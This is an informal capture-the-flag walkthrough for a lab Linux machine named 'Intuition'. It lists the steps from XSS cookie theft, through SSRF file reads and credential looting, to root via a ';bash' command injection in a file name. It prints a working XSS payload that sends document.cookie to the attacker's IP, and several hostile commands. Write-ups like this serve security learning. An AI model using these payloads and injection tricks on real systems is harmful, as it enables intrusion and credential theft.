Name: Intuition
Difficulty: Hard
OS: Linux

1) nmap scan:
port service
22   ssh
80   http

2.0) add comprezzor.htb to /etc/hosts
2.1) the http service offers a compression service using LZMA and since recently CVE-2024-3094 came out I entered the rabbit hole for like 2 hours
2.2) ffuf subdomain enum with common wordlist -> comprezzor.htb report.comprezzor.htb auth.comprezzor.htb dashboard.comprezzor.htb
2.3) report submission form has got xss
2.4.1) python3 -m http.server
2.4.2) ssrf via xss using <img src=q onerror="fetch('http://<my_ip>/?cookie='+document.cookie)">

3.1) webdev dashboard login with the obtained cookies
3.2) set high-priority function to use on reports, plus resolved/delete
3.3) set high priority seems to send another cookie of admin

4.1) admin dashboard has many funcitons: full report list - create backup - create pdf report
4.2) usually create pdf is vulnerable in this kind of boxes and the exploiting of wkhtmltopdf 0.12.6 seems to be the way to go
4.3) create a local webserver and insert the url on the create pdf funciton -> prints the list of my file system
4.4) it doesn't seem to be exploitable on the remote server btw
4.5) open a port for listeing with netcat and send a request to my netcat -> User-Agent: Python-urllib/3.11 -> CVE-2023â€“24329
4.6) add a blank space in front of the url to bypass the backend check
4.7) download the remote /etc/passwd with this url: file://///etc/passwd
4.8) search in file:///proc/self/cmdline for apps that are being used -> find python3/app/code/app.py
4.9) find that ftp server is being used and credentials
4.10) search for files in the ftp server with ftp://ftp_admin:<password>@ftp.local
4.11) the note contains the passphrase and the ssh private key

5.1) need to leak the username to use the ssh priv key but we have the passphrase to get it: ssh-keygen -p -f private_key(id_rsa) -> dev_acc@local
5.2) ssh to get the user flag

6.0) enumerate A LOT 
6.1) finding users with cat /etc/passwd -> adam dev_acc lopez
6.2) linpeas and netstat shows the open ports -> ligolo to access the services -> selenium on port 4444 -> not useful
6.3) found a users database containing usernames and hashes on /var/www/app/blueprints/auth/ -> adam password crack with hashcat 
6.4) ssh with those creds is not working
6.5) ftp with those creds works and adam had some files into /backup/runner1/ folder
6.6) cat the files to read the content and find the first part of an auth key and the second part in md5 format
6.7) crack the last 4 md5 digits with a custom script or your own method
6.8) the binary file cat tells us that it is using Ansible: ansible-galaxy and ansible-playbook with an error output

7.1) dev_acc can access the /opt/ folder but can't access runner2 and playbook folder because those are owned by the admin

8.1) lopez credentials found with zgrep -i lopez /var/log/suricata/*.gz
8.2) lopez can access the /opt/runner2 folder and also sudo -l shows up that lopez can run as admin runner2
8.3) https://gtfobins.github.io/gtfobins/ansible-playbook/ priv esc ansible playbook -> doesn't work
8.4) usage says json file as argument
8.5) after infinite researches and reversing, craft the json file, adding ;bash in the filename
8.6) the vuln will trigger running2 as admin, executing ;bash as root so we get the root shell
